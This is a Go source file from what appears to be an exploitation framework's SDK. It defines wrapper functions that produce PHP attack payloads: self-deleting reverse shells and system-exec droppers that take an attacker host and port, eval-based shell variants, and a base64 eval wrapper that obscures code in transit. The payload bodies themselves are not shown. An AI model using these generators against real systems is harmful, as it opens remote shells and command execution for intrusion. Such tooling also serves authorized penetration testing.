package sdk

// Late-binding hooks for PHP payload generation.
// Implementations live in pkg/payload, registered via init().
var (
	phpReverseShellFn func(string, int) string
	phpSystemFn       func(string) string
	phpEvalShellFn    func(string, int) string
	phpEvalSystemFn   func(string) string
)

// SetPHPReverseShell registers the PHP reverse shell drop implementation.
func SetPHPReverseShell(fn func(string, int) string) { phpReverseShellFn = fn }

// SetPHPSystem registers the PHP system exec drop implementation.
func SetPHPSystem(fn func(string) string) { phpSystemFn = fn }

// SetPHPEvalShell registers the PHP eval reverse shell implementation.
func SetPHPEvalShell(fn func(string, int) string) { phpEvalShellFn = fn }

// SetPHPEvalSystem registers the PHP eval system exec implementation.
func SetPHPEvalSystem(fn func(string) string) { phpEvalSystemFn = fn }

// PHPReverseShell returns a self-deleting PHP reverse shell for file drop.
// Reads LHOST/LPORT from the context automatically.
func PHPReverseShell(run *Context) string {
	p := run.Params()
	return phpReverseShellFn(p.Lhost(), p.Lport())
}

// PHPSystem returns a self-deleting PHP system exec for file drop.
func PHPSystem(cmd string) string {
	return phpSystemFn(cmd)
}

// PHPEvalShell returns PHP code (no tags) for a reverse shell via eval().
func PHPEvalShell(run *Context) string {
	p := run.Params()
	return phpEvalShellFn(p.Lhost(), p.Lport())
}

// PHPEvalSystem returns PHP code (no tags) for system exec via eval().
func PHPEvalSystem(cmd string) string {
	return phpEvalSystemFn(cmd)
}

// PHPEvalWrap wraps raw PHP code in eval(base64_decode('...')) for safe transport.
func PHPEvalWrap(code string) string {
	return Sprintf("eval(base64_decode('%s'));", Base64Encode(code))
}
